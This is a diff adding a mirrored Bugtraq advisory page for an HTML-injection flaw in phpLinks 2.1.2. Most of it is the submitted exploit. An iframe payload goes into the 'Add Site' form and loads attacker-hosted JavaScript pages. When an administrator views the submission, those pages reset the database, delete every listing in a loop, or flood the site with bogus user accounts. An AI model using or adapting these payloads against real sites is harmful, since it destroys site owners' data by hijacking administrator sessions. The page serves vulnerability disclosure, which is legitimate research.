@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid6632<p><b><span style="font-size: 18pt;">PHPLinks Add Site HTML Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6632/info">info</a><br><a href="http://www.securityfocus.com/bid/6632/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6632/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6632/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6632/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6632
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 16 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 16 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to JeiAr &lt;jeiar@kmfms.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					phpLinks phpLinks 2.1.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example was submitted by JeiAr &lt;jeiar@kmfms.com&gt;:<br/><br/>Put this in one of the field on "Add Site" form located at<br/>http://blah/phplinks/index.php?show=add&amp;PID=<br/>If you inject the code into the Site Title or Site Url field, the code<br/>will be ran as soon as a logged in administrator views it.<br/><br/>&lt;iframe src=http://blah/death.html&gt;&lt;/iframe&gt;<br/><br/>Below is the code for the called file "death.html"<br/><br/>---------------------------------------------------------------------------<br/>&amp;lt;script language=JavaScript&gt;<br/>var i = 10; // This is the number of the user ID to start deleting<br/>var BaseURL = "http://victimsite/phplinks/";<br/>window.open(BaseURL + '/admin/reset.php?<br/>reset_in=&amp;reset_out=&amp;search_terms=&amp;referrers=&amp;submit='); // this resets<br/>the database<br/>function Waste()<br/>{<br/>while (i) {<br/>i++;<br/>window.open(BaseURL + 'admin/delete_site.php?dbtable=links&amp;ID=' + i<br/>+ '&amp;sure=Yes');<br/> }<br/>}<br/>&amp;lt;/script&amp;gt;<br/>&lt;body onLoad="Waste();"&gt;<br/>---------------------------------------------------------------------------<br/><br/>As you can see, that code (when called by a logged in admin validating<br/>sites) is run, the database is in alot of cases going to be left empty. By<br/>the way, the dbtable=links can be changed to dbtable=temp in order to<br/>affect sites not yet approved etc. On the other hand you can add users to<br/>the database and more.  Take the following code for example:<br/><br/>&lt;iframe src=http://blah/life.html&gt;&lt;/iframe&gt;<br/><br/>Below is the code for the called file "life.html":<br/><br/>---------------------------------------------------------------------------<br/>&amp;lt;script language=JavaScript&gt;<br/>var i = 1;<br/>var BaseURL = "http://victimsite/phplinks/";<br/>function Gluttony()<br/>{<br/>while (i) {<br/>i++;<br/>window.open(BaseURL + '/admin/add_site.php?SiteName=JeiAr0wnethTheee' + i<br/>+ '&amp;SiteURL=http://www.b' + i + 'j.orfd&amp;Description=' + i<br/>+'3333333333333333333333333333333333&amp;Category=&amp;Country=Turkey.gif&amp;Email=1@t<br/>.' + i + '&amp;UserName=12345' + i<br/>+ '&amp;Password=12345678&amp;Hint=12345678910&amp;add=' + i + '&amp;sure=Yes');<br/> }<br/>}<br/>&amp;lt;/script&amp;gt;<br/>&lt;body onLoad="Gluttony();"&gt;<br/>---------------------------------------------------------------------------
+	
+		<ul>
+</ul>
+</div>
